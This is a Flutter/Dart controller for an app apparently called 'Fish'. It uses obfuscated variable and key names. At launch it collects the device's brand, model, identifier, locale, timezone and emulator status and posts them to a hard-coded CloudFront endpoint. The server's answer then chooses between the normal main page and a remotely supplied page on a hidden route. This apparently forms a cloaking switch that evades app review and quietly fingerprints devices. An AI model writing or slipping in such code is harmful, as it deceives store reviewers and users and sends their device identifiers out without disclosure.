import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FishLaunchLogic extends GetxController {

  var obklqzmi = RxBool(false);
  var ybqpzxea = RxBool(true);
  var fkeiq = RxString("");
  var carmen = RxBool(false);
  var pouros = RxBool(true);
  final owvepnigf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    hjpn();
  }


  Future<void> hjpn() async {
    carmen.value = true;
    pouros.value = true;
    ybqpzxea.value = false;

    owvepnigf.post("https://d26hbuajciplvb.cloudfront.net/L6dNs",data: await fzunbtavd()).then((value) {
      var vicfmrpq = value.data["vicfmrpq"] as String;
      var aewyfoul = value.data["aewyfoul"] as bool;
      if (aewyfoul) {
        fkeiq.value = vicfmrpq;
        lorena();
      } else {
        smith();
      }
    }).catchError((e) {
      ybqpzxea.value = true;
      pouros.value = true;
      carmen.value = false;
    });
  }

  Future<Map<String, dynamic>> fzunbtavd() async {
    final DeviceInfoPlugin bsmfiqv = DeviceInfoPlugin();
    PackageInfo wyjxtvdh_rdotvgcx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mzkq = Platform.localeName;
    var SUgW = currentTimeZone;

    var jsLIRNx = wyjxtvdh_rdotvgcx.packageName;
    var EkAta = wyjxtvdh_rdotvgcx.version;
    var PJOeB = wyjxtvdh_rdotvgcx.buildNumber;

    var GVZNx = wyjxtvdh_rdotvgcx.appName;
    var SCWnF = "";
    var MZVT  = "";
    var NwfgJd = "";
    var aliyahCassin = "";
    var edwinCrist = "";
    var rosendoFarrell = "";
    var clintonMarvin = "";
    var drakePadberg = "";
    var ambroseMcGlynn = "";
    var titoHodkiewicz = "";


    var Shsc = "";
    var lDIBLfij = false;

    if (GetPlatform.isAndroid) {
      Shsc = "android";
      var mtyoel = await bsmfiqv.androidInfo;

      NwfgJd = mtyoel.brand;

      SCWnF  = mtyoel.model;
      MZVT = mtyoel.id;

      lDIBLfij = mtyoel.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      Shsc = "ios";
      var ywxirp = await bsmfiqv.iosInfo;
      NwfgJd = ywxirp.name;
      SCWnF = ywxirp.model;

      MZVT = ywxirp.identifierForVendor ?? "";
      lDIBLfij  = ywxirp.isPhysicalDevice;
    }
    var res = {
      "GVZNx": GVZNx,
      "EkAta": EkAta,
      "jsLIRNx": jsLIRNx,
      "ambroseMcGlynn" : ambroseMcGlynn,
      "titoHodkiewicz" : titoHodkiewicz,
      "SCWnF": SCWnF,
      "rosendoFarrell" : rosendoFarrell,
      "SUgW": SUgW,
      "NwfgJd": NwfgJd,
      "edwinCrist" : edwinCrist,
      "MZVT": MZVT,
      "PJOeB": PJOeB,
      "mzkq": mzkq,
      "Shsc": Shsc,
      "lDIBLfij": lDIBLfij,
      "aliyahCassin" : aliyahCassin,
      "clintonMarvin" : clintonMarvin,
      "drakePadberg" : drakePadberg,

    };
    return res;
  }

  Future<void> smith() async {
    Get.offNamed("/FishMainPage");
  }

  Future<void> lorena() async {
    Get.offNamed("/FishTrue");
  }

}
